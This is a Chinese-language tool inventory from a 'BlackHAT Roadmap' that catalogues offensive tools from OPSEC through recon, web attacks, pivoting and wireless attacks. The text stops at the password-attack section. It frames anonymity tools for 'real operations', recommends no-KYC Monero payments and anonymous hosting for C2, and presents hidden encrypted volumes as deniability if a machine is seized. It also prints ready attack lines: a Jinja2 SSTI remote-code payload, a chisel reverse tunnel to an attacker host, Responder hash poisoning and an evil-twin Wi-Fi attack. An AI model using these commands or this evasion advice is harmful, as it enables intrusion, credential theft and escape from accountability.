# 工具清单

**作者：** Sagar Biswas（[@SagarBiswas-MultiHAT](https://github.com/SagarBiswas-MultiHAT)）<br/>
**规范仓库：** [The BlackHAT Roadmap](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap)<br/>
**许可证：** [CC BY-SA 4.0](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap/blob/main/LICENSE-DOCS)<br/>
**版本：** 1.0.0 · 2027 版<br/>

<div align="right">

#### 权威 2027 版 · 对初学者友好 · 内容完整 · 不含已废弃工具

</div>

> **这是本路线图唯一权威的工具参考。**
> 此前所有工具章节（基础版、2026 更新、2027 更新）均已合并至此。
> 此处列出的每款工具在 2027 年都仍处于活跃维护状态。
> 已确认停更或被取代的工具放在文末的 [❌ 已废弃工具栈](#deprecated-stack) 中。

>**配套路线图文档：**
> * **[The BlackHAT Roadmap（规范仓库）](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap)**：主课程体系、议题讨论与实时路线图更新。
> * **[主课程体系（阶段 -1 至 6）](../phases/PHASE_-1.md)**：从底层硬件到顶级行动的零基础到精英级攻防工程教学大纲。
> * **[BlackHat 长期生存战术](../black-bag/BlackHat_Long-Term_Survival_Tactics.md)**：权威的作战安全、物理作业手法与数字人设架构手册。
> * **[理念：BlackHat 思维模式](Philosophy_The_BlackHat_Mindset.md)**：认知准则、对抗性假设挖掘与原始思维的心智模型。
> * **[MITRE ATT&CK 速查](MITRE_ATT&CK_Quick_Reference.md)**：企业、ICS 与 ATLAS 技术映射、检测信号与攻击链蓝图。
> * **[实验环境搭建指南](Lab_Setup_Guide.md)**：多层级硬件规格与隔离的企业/内核实验环境蓝图。
> * **[资源汇总](Resources_Aggregated.md)**：精选书籍、研究白皮书、会议演讲存档与实战平台。
> * **[常见问题](FAQ.md)**：作战与职业转型的综合问答。
> * **[结语](Final_Word.md)**：文档核验统计、研究者署名与前沿研究路线图。

> **推荐的精编路线图资源：**
> * **[Awesome Cybersecurity Paths](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-paths)**：为渗透测试人员、红队成员、蓝队成员与安全研究者精选的成长路径。
> * **[渗透测试路线图](https://github.com/SagarBiswas-MultiHAT/penetration-testing-roadmap)**：实战评估工作流、工具矩阵与项目执行方法论。
> * **[Awesome Cybersecurity Books](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-books)**：精选的攻防安全与底层系统文献。

---

## 目录

1. [如何阅读本清单](#如何阅读本清单)
2. [阶段 -1：OPSEC 与匿名化](#phase-neg1-opsec)
3. [阶段 0：基础环境](#phase-0-foundation)
4. [阶段 1：Web 应用安全](#phase-1-web)
5. [阶段 2：侦察、网络与基础设施](#phase-2-recon)
6. [阶段 3：二进制与系统漏洞利用](#phase-3-binary)
7. [阶段 4A/B：植入体、C2 与加载器开发](#phase-4ab-implant)
8. [阶段 4C：EDR / AV 规避](#phase-4c-edr)
9. [阶段 4D：漏洞研究与 0-Day](#phase-4d-vr)
10. [阶段 4E：APT 持久化、rootkit 与反取证](#phase-4e-apt)
11. [阶段 4F：云、AiTM 与高级 Web](#phase-4f-cloud)
12. [阶段 4G：硬件、SDR 与嵌入式](#phase-4g-hardware)
13. [阶段 4H：供应链](#phase-4h-supply-chain)
14. [阶段 4I：Active Directory 与身份](#phase-4i-ad)
15. [AI / LLM 攻击面](#ai-llm-attack-surface)
16. [阶段 5：GREATEST —— 漏洞研究与 0-Day 挖掘](#phase-5-greatest)
17. [阶段 6：特种行动 —— 物理、社会与量子](#phase-6-special-operations)
18. [练习平台](#practice-platforms)
19. [必备资源](#essential-resources)
20. [❌ 已废弃工具栈 —— 请勿使用](#deprecated-stack)

---

## 如何阅读本清单

每条工具条目都按以下格式展示：

```
工具名称 | 许可证 | 安装/链接 | 功能说明（通俗语言）
```

**许可证标签：**

| 标签 | 含义 |
|-------|---------|
| `FREE` | 完全免费，永久免费 |
| `OSS` | 开源，可免费使用 |
| `FREEMIUM` | 提供免费档，付费档才能解锁完整功能 |
| `COMMERCIAL` | 付费。无实质免费档。已知价格会标注 |
| `FREE (hardware)` | 软件免费，但需另行购买硬件 |

**阶段标签** 表示你最早需要该工具的阶段。
你不需要一次性装齐所有工具。到达对应阶段时再安装。

> 💡 **新手规则：** 第一天就开始阶段 -1。阶段 0 要先于其他一切。
> 在你真正进入阶段 4 之前，不要安装阶段 4 的工具。
> 一台装了 200 个你不懂的工具的 Kali，比只装 10 个你精通的干净系统更慢。

---

### 🧭 路线图工具进阶管线

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Tools_Inventory/1._Roadmap_Tool_Progression_Pipeline.png" alt="路线图工具进阶管线" width="400"/>

</td></tr></table>
</div>

---


<a id="phase-neg1-opsec"></a>
## 阶段 -1：OPSEC 与匿名化

> **在动用本清单中任何其他工具之前，先搭好你的 OPSEC 工具栈。**
> 这不是可选项，也不是最后一步。这是第一步。
> 本节工具保护你自身。其他工具只负责提供能力。

---

### 🖥️ 操作系统

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Tails OS** | `OSS` | https://tails.boum.org | 从 USB 启动的 Live 操作系统，不在宿主机器上留下任何痕迹。所有流量经 Tor 转发。按设计即遗忘：关机后一切消失。 |
| **Whonix** | `OSS` | https://www.whonix.org | 双虚拟机结构：网关虚拟机强制所有流量走 Tor。工作站虚拟机承载你的实际操作。即使工作站被攻陷，你的真实 IP 也无法泄漏。 |
| **Qubes OS** | `OSS` | https://www.qubes-os.org | 以隔间化实现安全的操作系统。每个“qube”都是隔离的虚拟机。在一个里浏览网页，在另一个里写代码，在第三个里做 OPSEC 工作。被攻陷的 qube 无法触及其他 qube。 |
| **Kali Linux** | `OSS` | https://www.kali.org | 主攻击平台。基于 Debian。预装本清单中的大部分工具。阶段 1–4 的主力工作系统。 |
| **ParrotOS** | `OSS` | https://parrotsec.org | 比 Kali 更轻量的替代方案。适合老旧硬件，也可作为辅助虚拟机。 |

> 💡 **新手提示（操作系统）：** 阶段 0–2 用虚拟机里的 Kali 就够。阶段 3 及以上，请在物理机上或专用实验环境中使用 Kali。真实行动请用 Tails 或 Whonix。绝不要用你日常使用的那台个人机器。

---

### 🔒 匿名化与路由

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Tor Browser** | `OSS` | https://www.torproject.org | 让你的浏览器流量经 Tor 匿名网络转发。三跳，出口节点会改变你对外显示的 IP。匿名浏览的起点。 |
| **Mullvad VPN** | `COMMERCIAL`（约 $5/月） | https://mullvad.net | 严格不记录日志的 VPN。接受 Monero 与现金。只用账号编号，无需邮箱。少数真正被严肃从业者信任的 VPN 之一。 |
| **Proton VPN** | `FREEMIUM` | https://protonvpn.com | 瑞士司法辖区，无日志政策经独立审计。免费档速度慢但可用。付费档（$5/月）适合分层 OPSEC（VPN → Tor）。 |
| **I2P** | `OSS` | https://geti2p.net | 另一种匿名网络。点对点，无单一目录服务器。比 Tor 慢，但在某些用途上更好（文件共享、I2P 内部的隐藏服务）。 |

> 💡 **新手提示（VPN + Tor）：** 单用 VPN 并不等于匿名。VPN 只是把“谁能看到你的流量”从你的 ISP 换成 VPN 服务商。真正的匿名链路：VPN → Tor → 目标。首选推荐 Mullvad，因为它接受 Monero、不要求邮箱，且从未记录过日志。

---

### 🔐 设备与存储安全

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **VeraCrypt** | `OSS` | https://veracrypt.fr | 创建加密容器（可当作加密磁盘使用的文件）与全盘加密。AES-256 + Twofish + Serpent 级联。把所有敏感工作都存放在这里。 |
| **GrapheneOS** | `OSS` | https://grapheneos.org | 面向 Google Pixel 设备的加固 Android。移除 Google Play 服务。用于行动手机。在 OPSEC 可控性上优于 iOS。 |

> 💡 **新手提示（VeraCrypt）：** 为你的字典、载荷和任何敏感工作文件创建加密容器。绝不要把这些以明文形式存放在攻击机上。如果机器被查扣，加密容器配合隐藏卷可以给你合理的否认空间。

---

### 💬 加密通信

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Signal** | `OSS` | https://signal.org | 端到端加密消息与通话的行业标准。密封发件人、定时消失消息。任何敏感沟通都用它。 |
| **Element (Matrix)** | `OSS` | https://element.io | 基于 Matrix 协议的联邦式端到端加密聊天。可自建。适合作为 Discord 的替代方案，实现不依赖中心服务器的团队沟通。 |
| **Briar** | `OSS` | https://briarproject.org | 可经 Tor、蓝牙或 Wi-Fi 工作，无需中心服务器。可离线运行。为活动人士与记者设计，但对无服务器通信同样有价值。 |

---

### 💰 财务 OPSEC

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Feather Wallet** | `OSS` | https://featherwallet.org | 桌面端 Monero 钱包。轻量，无需下载完整区块链。Monero 是唯一具备真正隐私性的主流加密货币（环签名、隐匿地址、RingCT）。 |
| **Haveno** | `OSS` | https://haveno.exchange | 去中心化的点对点 Monero 交易所。无 KYC。LocalMonero 于 2024 年 11 月关停后的替代方案。 |

---

### 🔍 元数据清除

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **MAT2** | `OSS` | https://0xacab.org/jvoisin/mat2 | 清除文件中的元数据：PDF、图片、办公文档、音频。`mat2 filename` 会剥离全部元数据。安装：`sudo apt install mat2` |
| **ExifTool** | `OSS` | https://exiftool.org | 读取、写入并清除图片与文件中的 EXIF 元数据。也适用于取证。`exiftool -all= filename.jpg` 清除全部元数据。 |
| **Dangerzone** | `OSS` | https://dangerzone.rocks | 把不可信文档（PDF、Office 文件）放入容器沙箱化，转换为安全的 PDF。打开任何不可信文档之前先做这一步。安装：https://dangerzone.rocks/#installation |

---

### 🌐 基础设施 / 重定向器

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Njalla** | `COMMERCIAL`（约 $15/月 VPS） | https://njal.la | 注重隐私的域名注册商与 VPS 服务商。接受 Monero。无需实名注册。用于 C2 基础设施与匿名域名。 |
| **Certbot** | `OSS` | https://certbot.eff.org | 自动签发 Let's Encrypt SSL 证书。所有 C2 基础设施都应启用 HTTPS。`certbot --nginx -d yourdomain.com` |
| **Apache mod_rewrite / Nginx** | `OSS` | 系统软件包 | C2 重定向器。部署在 C2 服务器前面，只转发合法的信标流量，其余全部拦截。阻止蓝队直接触达你的 C2。 |
| **Cloudflare Workers** | `FREEMIUM` | https://workers.cloudflare.com | 用作域前置与 C2 重定向器的无服务器函数。有免费档。流量看起来来自 Cloudflare 的 IP。 |

---

<a id="phase-0-foundation"></a>
## 阶段 0：基础环境

> 开始学习之前先把实验环境搭好。你无法在生产系统上学会漏洞利用。
> 搭一套本地实验环境：Kali 攻击机 + Windows 11 靶机 + Windows Server 2022（AD）+ Ubuntu 22.04 靶机。

---

### 🖥️ 虚拟化

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **VirtualBox** | `OSS` | https://www.virtualbox.org | 免费虚拟机软件。创建并运行你的实验虚拟机。支持完整快照。跨平台。大多数初学者的起点。 |
| **VMware Workstation Pro** | `FREE`（2024 年起个人使用免费） | https://www.vmware.com/products/workstation-pro.html | 在嵌套虚拟化与内核调试方面性能优于 VirtualBox。VMware 于 2024 年对个人使用免费。阶段 3 及以上工作的首选。 |

---

### 🔧 调试与分析（基础层）

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **GDB** | `OSS` | `sudo apt install gdb` | GNU 调试器。Linux 二进制分析的基础。设置断点、查看内存、单步执行指令。先学它，再学 pwntools。 |
| **GEF** (GDB Enhanced Features) | `OSS` | https://gef.blah.cat | 为 GDB 增加彩色输出、堆可视化、寄存器上下文与漏洞利用开发辅助的插件。安装：`bash -c "$(curl -fsSL https://gef.blah.cat/sh)"` |
| **pwndbg** | `OSS` | https://github.com/pwndbg/pwndbg | 另一款 GDB 插件。堆块可视化比 GEF 更好（调试堆漏洞时使用）。安装：`git clone https://github.com/pwndbg/pwndbg && ./setup.sh` |
| **strace** | `OSS` | `sudo apt install strace` | 跟踪进程发起的系统调用。精确看到二进制读取、写入、打开和执行了什么。`strace ./binary` |
| **ltrace** | `OSS` | `sudo apt install ltrace` | 跟踪库函数调用（libc 函数：malloc、strcpy 等）。在阅读汇编之前理解二进制行为时很有用。 |
| **readelf** | `OSS` | 内置于 binutils | 显示 ELF 二进制头、节区与符号。`readelf -a binary` 能在你打开反汇编器之前告诉你文件结构的全部信息。 |
| **objdump** | `OSS` | 内置于 binutils | 反汇编并显示 ELF 目标文件。`objdump -d -M intel binary` 可在不打开 Ghidra 的情况下快速反汇编。 |
| **strings** | `OSS` | 内置于 binutils | 从二进制中提取可打印字符串。任何静态分析的第一步。`strings binary \| grep -i pass` |
| **file** | `OSS` | 内置于 coreutils | 识别文件类型。在做任何事之前先运行 `file target`。它会告诉你架构、链接方式以及是否被 strip。 |

> 💡 **新手提示（GEF vs pwndbg）：** 选一个深入学，不要频繁换来换去。GEF 在通用漏洞利用开发上界面更清爽。pwndbg 的堆可视化更好。多数初学者从 GEF 起步，做堆题时切到 pwndbg，两个都装着。它们并不冲突 —— 在 `.gdbinit` 里设置默认即可。

---

### 🐍 语言环境

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Python 3** | `OSS` | `sudo apt install python3 python3-pip` | 主力脚本语言。你在阶段 0–3 写的每个工具都从这里开始。先学它。 |
| **pip3** | `OSS` | 随 Python 3 附带 | Python 包安装器。`pip3 install pwntools` —— 这条命令你会敲上百遍。 |
| **gcc / g++** | `OSS` | `sudo apt install build-essential` | C 与 C++ 编译器。你的植入体、漏洞利用程序和 shellcode 都将在这里编译。 |
| **Rust toolchain** | `OSS` | https://rustup.rs (`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs \| sh`) | Rust 编译器 + cargo 包管理器。阶段 4A 的攻防工具越来越多用 Rust 编写。先学 C，到阶段 4A 再加 Rust。 |
| **Go** | `OSS` | https://go.dev/dl/ | Go 语言。Sliver C2、部分攻防工具以及快速的命令行工具都用 Go 编写。`sudo apt install golang` |

---

<a id="phase-1-web"></a>
## 阶段 1：Web 应用安全

> PortSwigger Web Security Academy（免费）是本阶段的主要学习资源。
> 下面每款工具都对应你将在那里完成的实验。

---

### 🌐 核心 Web 代理

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Burp Suite Community** | `FREE` | https://portswigger.net/burp/communitydownload | 在你浏览器与目标之间拦截流量的 HTTP 代理。检视、修改并重放每一个请求。最重要的 Web 安全工具，没有之一。 |
| **Burp Suite Professional** | `COMMERCIAL`（约 $449/年） | https://portswigger.net/burp/pro | 完整版增加了自动化扫描器、Collaborator（带外服务器）和高级 intruder。初学者不必购买 —— 阶段 1–2 用 Community 就够。 |
| **OWASP ZAP** | `OSS` | https://www.zaproxy.org | Burp 的免费开源替代方案。直观性稍差，但功能完整。适合作为辅助工具或 Burp 的替代。 |
| **Caido** | `FREEMIUM` | https://caido.io | 现代、基于 Rust 的 HTTP 代理。比 Burp 更快，界面更清爽。采用率在上升。免费档可用。 |

> 💡 **新手提示（Burp Suite）：** 在 Firefox 里配置 FoxyProxy，把流量指向 Burp 的代理 `127.0.0.1:8080`。在 Firefox 中安装 Burp 的 CA 证书，才能拦截 HTTPS。这是你进行每一次 Web 攻击的工作台。先掌握它，再碰其他 Web 工具。

---

### 📁 目录与内容发现

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **feroxbuster** | `OSS` | https://github.com/epi052/feroxbuster (`curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh \| bash`) | 用 Rust 编写的快速递归目录爆破器。与 gobuster 不同，它会自动递归发现子目录。**目录枚举请用它，而不是 gobuster。** |
| **ffuf** | `OSS` | https://github.com/ffuf/ffuf (`sudo apt install ffuf`) | 快速的 Web 模糊测试器。适用于目录、参数、请求头、虚拟主机、POST 请求体 —— 任何含占位符的地方。比 feroxbuster 更灵活。两者配合使用。 |
| **gobuster** | `OSS` | `sudo apt install gobuster` | 目录与 DNS 爆破。不递归，但文档齐全，多数通关教程里都会出现。要学，但实战请优先用 feroxbuster。 |

> 💡 **新手提示（feroxbuster vs ffuf）：** feroxbuster 更适合深层目录枚举（递归、自动通配符过滤）。ffuf 更适合参数模糊测试、虚拟主机发现，以及任何需要精确注入载荷的场景。实践中两者都用：feroxbuster 做初始侦察，ffuf 做定向模糊测试。
>
> 快速参考：
> ```bash
> # 目录枚举
> feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt
>
> # 参数模糊测试
> ffuf -u "http://target.com/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/common.txt
>
> # 虚拟主机发现
> ffuf -u http://target.com -H "Host: FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
> ```

---

### 💉 注入与漏洞利用

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **sqlmap** | `OSS` | `sudo apt install sqlmap` | 自动化的 SQL 注入检测与利用。识别注入点、导出数据库、读取文件，有时能拿到操作系统 shell。`sqlmap -u "http://target.com/page?id=1" --dbs` |
| **tplmap** | `OSS` | https://github.com/epinna/tplmap (`git clone && pip3 install -r requirements.txt`) | 服务端模板注入（SSTI）检测与利用。支持 Jinja2、Twig、Smarty、Freemarker、Mako 以及另外 15 种引擎。`python3 tplmap.py -u "http://target.com/page?name=*"` |
| **XSStrike** | `OSS` | https://github.com/s0md3v/XSStrike | 具备上下文感知载荷生成的 XSS 扫描器。比基础的载荷列表更聪明。 |
| **dalfox** | `OSS` | https://github.com/hahwul/dalfox (`go install github.com/hahwul/dalfox/v2@latest`) | 现代 XSS 扫描器。参数分析、DOM XSS 检测、盲打 XSS 支持。速度快。可接收其他工具通过管道传入的目标。 |
| **NoSQLMap** | `OSS` | https://github.com/codingo/NoSQLMap | NoSQL 注入（MongoDB、CouchDB、Redis）利用工具。 |

> 💡 **新手提示（SSTI）：** 服务端模板注入指用户输入被模板引擎渲染，从而在服务器上执行你的代码。用 `{{7*7}}` 测试 —— 如果响应里出现 `49`，就存在 SSTI。tplmap 可以自动化这个过程。手工利用时，像 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` 这样的 Jinja2 载荷往往能拿到 RCE。先学手工手法，再让 tplmap 辅助。

---

### 🔑 JWT 攻击

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **jwt_tool** | `OSS` | https://github.com/ticarpi/jwt_tool (`pip3 install jwt_tool` 或 clone) | JWT 测试工具包。测试算法混淆（RS256→HS256）、`none` 算法绕过、JKU/X5U 注入、`kid` 参数注入。`python3 jwt_tool.py TOKEN -M at` 会运行全部攻击。 |
| **hashcat**（用于 JWT 破解） | `OSS` | `sudo apt install hashcat` | 用弱密钥破解 HS256 JWT。模式：`hashcat -a 0 -m 16500 TOKEN wordlist.txt` |

> 💡 **新手提示（JWT）：** JWT 由点号分隔的三段 base64url 编码组成：header.payload.signature。最常见的攻击是算法混淆：如果服务器使用 RS256（非对称），就诱使它接受以公钥作为 HMAC 密钥的 HS256（对称）。jwt_tool 可自动化这一过程。始终测试 `alg: none` —— 很多旧实现仍然接受。

---

### 📡 带外与 SSRF

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **interactsh** | `OSS` | https://github.com/projectdiscovery/interactsh (`go install`，或使用网页版：https://app.interactsh.com) | 带外交互服务器。给你一个唯一 URL/子域名，用于记录 DNS 查询、HTTP 请求与 SMTP。盲打 SSRF、XXE、盲命令注入必备。 |
| **Burp Collaborator** | `COMMERCIAL`（Pro 版已包含） | 内置于 Burp Suite Professional | Burp 的带外服务器。概念与 interactsh 相同，但集成在 Burp 工作流中。Community 用户请用 interactsh。 |
| **ssrfmap** | `OSS` | https://github.com/swisskyrepo/SSRFmap | SSRF 利用自动化。测试常见内网端点、AWS 元数据、GCP 元数据与 file:// 读取。 |

---

### 🔀 HTTP 请求走私

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **smuggler** | `OSS` | https://github.com/defparam/smuggler (`pip3 install smuggler`) | 检测 CL.TE、TE.CL 与 TE.TE 类型的 HTTP 请求走私漏洞。`python3 smuggler.py -u https://target.com` |
| **Burp Suite Pro (HTTP Request Smuggler extension)** | `COMMERCIAL` | BApp Store | 最完整的 HRS 测试工具。Community 用户也可借助 PortSwigger Academy 的 HRS 实验（免费）中的手工手法达到同样效果。 |

---

### 🔬 扫描与自动化

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **nuclei** | `OSS` | https://github.com/projectdiscovery/nuclei (`go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`) | 基于模板的漏洞扫描器。7,000 多个社区模板，覆盖 CVE、错误配置、默认凭据与信息暴露。`nuclei -u https://target.com` 会运行全部模板。快速且可扩展。 |
| **nikto** | `OSS` | `sudo apt install nikto` | Web 服务器扫描器，查找常见错误配置、过时软件与危险文件。噪声大但全面。`nikto -h http://target.com` |

---

### 🧪 API 测试

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Postman** | `FREEMIUM` | https://www.postman.com | 用于构建、发送与组织 API 请求的图形界面。适合在自动化之前手工探索 API。 |
| **ParamSpider** | `OSS` | https://github.com/devanshbatham/ParamSpider | 从 Web 存档（Wayback Machine）中为目标域名挖掘参数。找出可能从未被测试过的隐藏参数。输出可交给 ffuf。 |
| **Arjun** | `OSS` | https://github.com/s0md3v/Arjun (`pip3 install arjun`) | HTTP 参数发现工具。找出隐藏的 GET、POST、JSON 与 XML 参数。 |

---

<a id="phase-2-recon"></a>
## 阶段 2：侦察、网络与基础设施

---

### 🔭 侦察与 OSINT

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Shodan** | `FREEMIUM` | https://www.shodan.io | 面向互联网设备的搜索引擎。查询语法：`hostname:target.com port:443 country:US`。免费账户结果有限。付费（约 $17/月）可解除限制。 |
| **Shodan CLI** | `OSS` | `pip3 install shodan` then `shodan init YOUR_API_KEY` | 命令行的 Shodan。可脚本化侦察：`shodan search --fields ip_str,port,org "product:nginx country:US"` |
| **FOFA** | `FREEMIUM` | https://fofa.info | 中国的 Shodan 替代方案。对东亚基础设施的覆盖更好。索引数据不同 —— 与 Shodan 并用可得到完整图景。 |
| **Censys** | `FREEMIUM` | https://search.censys.io | 全网扫描数据。适合证书透明度分析与主机发现。`search.censys.io` 的免费档已经很有用。 |
| **theHarvester** | `OSS` | `sudo apt install theharvester` | 从公开来源（Google、Bing、LinkedIn、Shodan）收集邮箱、子域名、主机与员工姓名。`theHarvester -d target.com -b all` |
| **recon-ng** | `OSS` | `sudo apt install recon-ng` | 功能完整的 OSINT 框架，带模块体系（可类比 OSINT 领域的 Metasploit）。安装模块：`marketplace install all`。构建结构化侦察工作流。 |
| **SpiderFoot** | `OSS` | https://github.com/smicallef/spiderfoot (`pip3 install spiderfoot`) | 自动化 OSINT 聚合器。运行 200 多个模块，绘制 IP、邮箱、域名、用户名之间的关系。提供可视化 Web 界面。 |
| **Maltego** | `FREEMIUM` | https://maltego.com | 用于 OSINT 的链路分析平台。可视化实体之间的关系。免费 Community 版功能有限但可用。 |
| **OSINT Framework** | `FREE`（网页） | https://osintframework.com | 按类别组织的 OSINT 工具与资源目录。它本身不是工具：而是各种 OSINT 目标类型可查资源的全景图。收藏它。 |

---

### 🌐 子域名与资产发现

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **subfinder** | `OSS` | https://github.com/projectdiscovery/subfinder (`go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest`) | 从 50 多个来源（证书透明度、DNS 记录、威胁情报）被动枚举子域名。快速、安静。`subfinder -d target.com -o subs.txt` |
| **amass** | `OSS` | https://github.com/owasp-amass/amass (`go install github.com/owasp-amass/amass/v4/...@master`) | 深度攻击面测绘。主动 + 被动子域名枚举、DNS 爆破、ASN 枚举。比 subfinder 更全面，但更慢。`amass enum -d target.com` |
| **assetfinder** | `OSS` | https://github.com/tomnomnom/assetfinder (`go install github.com/tomnomnom/assetfinder@latest`) | 快速被动子域名发现工具。比 amass 简单。适合快速侦察。与 subfinder 配合可提升覆盖率。 |

> 💡 **新手提示（侦察管线）：** 把 Project Discovery 的工具串成完整侦察管线：
> ```bash
> # 1. 子域名发现
> subfinder -d target.com -o subs.txt
>
> # 2. 探测哪些还活着
> cat subs.txt | httpx -silent -o live.txt
>
> # 3. 扫描存活主机上的漏洞
> nuclei -l live.txt -o results.txt
> ```
> 这三条命令串起来可替代数小时的手工劳动。

---

### 📡 HTTP 探测与指纹识别

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **httpx** | `OSS` | https://github.com/projectdiscovery/httpx (`go install github.com/projectdiscovery/httpx/cmd/httpx@latest`) | 快速 HTTP 探测工具包。输入子域名/IP 列表，识别哪些存活及其状态码、标题、技术栈、跳转。`cat subs.txt \| httpx -silent -title -tech-detect` |
| **whatweb** | `OSS` | `sudo apt install whatweb` | Web 技术指纹识别。检测 CMS、服务器软件、JavaScript 库与分析工具。`whatweb http://target.com` |
| **wafw00f** | `OSS` | `pip3 install wafw00f` | 检测目标受哪种 WAF（Web 应用防火墙）保护。发起攻击前先搞清楚你在对付什么。`wafw00f https://target.com` |

---

### 🔍 网络扫描

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Nmap** | `OSS` | `sudo apt install nmap` (or https://nmap.org) | 网络扫描器。端口扫描、服务/版本识别、操作系统指纹识别，以及用于漏洞检测的 NSE 脚本。`nmap -sC -sV -oA scan target` |
| **Masscan** | `OSS` | `sudo apt install masscan` | 最快的 TCP 端口扫描器。6 分钟可扫完整个互联网。适合大范围扫描，再把结果交给 Nmap 做服务识别。`masscan -p1-65535 --rate 10000 target` |
| **rustscan** | `OSS` | https://github.com/RustScan/RustScan | 基于 Rust 的端口扫描器。做初始端口发现比 Nmap 更快。自动把结果传给 Nmap。`rustscan -a target -- -sC -sV` |

---

### 🕸️ 网络分析

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Wireshark** | `OSS` | `sudo apt install wireshark` | 带图形界面的抓包与协议分析工具。精确看到线路上究竟跑着什么。在攻击某个协议之前理解它，这是必备手段。 |
| **tcpdump** | `OSS` | `sudo apt install tcpdump` | 命令行抓包。更快，且可脚本化。`tcpdump -i eth0 -w capture.pcap` |
| **Responder** | `OSS` | https://github.com/lgandx/Responder (`sudo apt install responder`) | 在局域网内投毒 LLMNR、NBT-NS 与 MDNS 广播请求，以捕获 NTLMv2 哈希。内网攻击必备。`sudo responder -I eth0 -dwv` |

---

### 🔀 跳板与隧道

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Ligolo-ng** | `OSS` | https://github.com/nicocha30/ligolo-ng | **2027 年的跳板标准。** 在攻击机上创建 TUN 接口。发往内网的流量会自动经被攻陷主机上的 agent 路由。无需 socks5 + proxychains。比替代方案更可靠、更快。 |
| **Chisel** | `OSS` | https://github.com/jpillora/chisel | 基于 SSH 的 HTTP 隧道。适合只允许 HTTP/HTTPS 出网的环境。攻击机上 `chisel server --port 8080 --reverse`，目标上 `chisel client attacker:8080 R:socks`。 |
| **rpivot** | `OSS` | https://github.com/klsecservices/rpivot | 反向 SOCKS 代理。当目标无法直接向你的机器发起连接时可用。 |
| **pwncat** | `OSS` | https://github.com/calebstewart/pwncat (`pip3 install pwncat-cs`) | 增强型反弹/绑定 shell 处理器。自动升级 shell、上传下载文件、维持持久化，并内置后渗透模块。用它替换你的 netcat 监听。 |

> 💡 **新手提示（Ligolo-ng）：** 传统跳板需要 socks5 代理 + proxychains，这会让很多工具失效。Ligolo-ng 在你的机器上创建真实的网络接口并路由到内网；所有工具都能原生工作，包括 Nmap 扫描与图形界面工具。这就是它取代 Chisel 成为默认跳板工具的原因。

---

### 📶 无线攻击

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **aircrack-ng** | `OSS` | `sudo apt install aircrack-ng` | 完整的无线安全评估套件。WEP/WPA 破解、监听模式、数据包注入、deauth 攻击。`airmon-ng`、`airodump-ng`、`aireplay-ng`、`aircrack-ng` —— 整套都要学。 |
| **hcxdumptool** | `OSS` | `sudo apt install hcxdumptool` | 捕获 PMKID 哈希与 WPA 握手。现代做法：抓 PMKID 无需对客户端发 deauth。`hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=3` |
| **hcxtools** | `OSS` | `sudo apt install hcxtools` | 把抓包文件转换为 hashcat 格式。`hcxpcapngtool -o hash.hc22000 capture.pcapng`，再用 hashcat mode 22000 破解。 |
| **hostapd-wpe** | `OSS` | https://github.com/OpenSecurityResearch/hostapd-wpe | 用于捕获 WPA2-Enterprise（EAP）凭据的流氓接入点。伪造企业 Wi-Fi AP 以捕获域凭据。 |
| **eaphammer** | `OSS` | https://github.com/s0md3v/eaphammer (`pip3 install eaphammer`) | 自动化 WPA2-Enterprise 邪恶双子攻击。`eaphammer --cert-wizard` 生成证书，然后 `eaphammer -i wlan0 --essid "CorpWifi"` 发起攻击。 |

---

### 🔓 口令攻击

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
